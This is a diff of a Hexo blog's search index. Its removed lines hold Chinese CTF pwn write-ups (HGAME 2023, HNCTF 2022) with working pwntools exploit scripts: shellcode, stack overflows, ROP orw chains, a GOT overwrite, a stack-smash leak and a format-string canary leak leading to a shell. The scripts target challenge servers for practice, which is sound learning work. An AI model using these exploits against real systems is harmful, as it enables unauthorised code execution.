 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28840</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>HNCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[HGAME 2023 week1] PWN 复现</title>
-    <url>/%5BHGAME%202023%20week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>[HGAME 2023 week1] PWN 复现</p>
-<span id="more"></span>
-
-<h2><span id="test_nc">test_nc</span></h2><p>签到题：</p>
-<blockquote>
-<p>nc 一下</p>
-<p>cat flag</p>
-</blockquote>
-<hr>
-<h2><span id="easy_overflow">easy_overflow</span></h2><p>经典的栈溢出，但需要注意 <code>close(1)</code> 关闭了标准输出流，因此需先打开才能拿到 shell。EXP 如下</p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40117E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="simple_shellcode">simple_shellcode</span></h2><p>首先ida一下，可以很明显的了解到跟沙盒有关，再查一下沙盒机制，显然不能直接构造orw，再加上read所存储的字节数少，不能直接构造，所以可以在mmap上面来构造orw</p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>mmap函数解析：</p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28291</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0xcafe0000</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="orw">orw</span></h2><p>先ida一下，可以看出来需要进行栈迁移，并且还存在沙盒，还有一段0x30的空间（溢出的空间较大），这就是为什么exp和[NSSCTF Round#14 Basic] rbp 不一样的原因，可溢出的空间不同，导致所利用的条件不同</p>
-<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
-<p>先泄露libc，再把orw写在自己确定的bss段，再用 leave ret 转到bss段，执行orw</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28392</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret     = <span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x401391</span></span><br><span class="line">bss_addr        = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">puts_plt        = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got        = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr       = <span class="number">0x4012c0</span></span><br><span class="line">leave_ret       = <span class="number">0x4012be</span></span><br><span class="line">read            = <span class="number">0x4012CF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;task.\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_addr  = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr  = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x142c92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>) + p64(bss_addr+<span class="number">0x100</span>) + p64(read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="choose_the_seat">choose_the_seat</span></h2><p>该题存在数组越界导致的 GOT overwrite 利用流程，利用负数越界和 one‑gadget 获取 shell，这题有点难，不太会写，此题存在数组越界（下次懂了再来）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./choose&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28620</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-8&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget  = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>HGAME</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[HNCTF 2022 WEEK3] smash 复现</title>
-    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash 复现</p>
-<span id="more"></span>
-
-<h1><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>接下来我们就需要了解一下 stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
-<blockquote>
-<h2><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
-</blockquote>
-<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>也可以这样算</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
-<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>HNCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[HNCTF 2022 WEEK4] ezcanary 复现</title>
-    <url>/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>[HNCTF 2022 WEEK4] ezcanary 复现</p>
-<span id="more"></span>
-
-<h1><span id="ezcanary">ezcanary</span></h1><p>先查一下保护机制，打开 canary 和 NX，这个时候需要注意可以泄露 canary</p>
-<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>IDA 一下，看看伪代码，思路很清晰了，<code>printf</code> 造成了格式字符串漏洞和第二个 <code>read</code> 造成的溢出</p>
-<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>接下来就是想办法溢出 canary，并且泄露 libc，先运行一下程序，看看偏移吧（很容易发现偏移是六），接下来就是 gdb 调试，看看 canary 位置了，把断点打在 <code>printf</code></p>
-<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>显然 canary 就是第 51 个参数（这个你不会看不出来吧，评论区见），这样就可以得到 canary 的地址了，接下来就剩下泄露 libc 了，注意下面两个参数就是可以泄露的 libc 地址 <code>0x7ffff7db0d90</code>（注意不同代码的颜色），再从 <code>vmmap</code> 找到 libc，然后就可以算到偏移了，最后就可以得到 libc 的基址了（太裤辣）</p>
-<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p>后面就是正常的溢出了</p>
-<h1><span id="exp">exp ：</span></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28441</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">rdi_addr = <span class="number">0x401323</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;%51$p.%53$p&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -1624,6 +1624,26 @@ Address space layout randomization</li>
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<p>hello world</p>
+<span id="more"></span>
+<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><pre><code>$ hexo new &quot;My New Post&quot;
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3><span id="run-server">Run server</span></h3><pre><code>$ hexo server
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3><span id="generate-static-files">Generate static files</span></h3><pre><code>$ hexo generate
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><pre><code>$ hexo deploy
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>highlight-test</title>
     <url>/highlight-test/</url>
     <content><![CDATA[<p>高亮部分修改</p>
@@ -1660,25 +1680,5 @@ sljkdfkljd
         <tag>hexo</tag>
         <tag>demo</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<p>hello world</p>
-<span id="more"></span>
-<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><pre><code>$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3><span id="run-server">Run server</span></h3><pre><code>$ hexo server
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3><span id="generate-static-files">Generate static files</span></h3><pre><code>$ hexo generate
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><pre><code>$ hexo deploy
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
 </search>
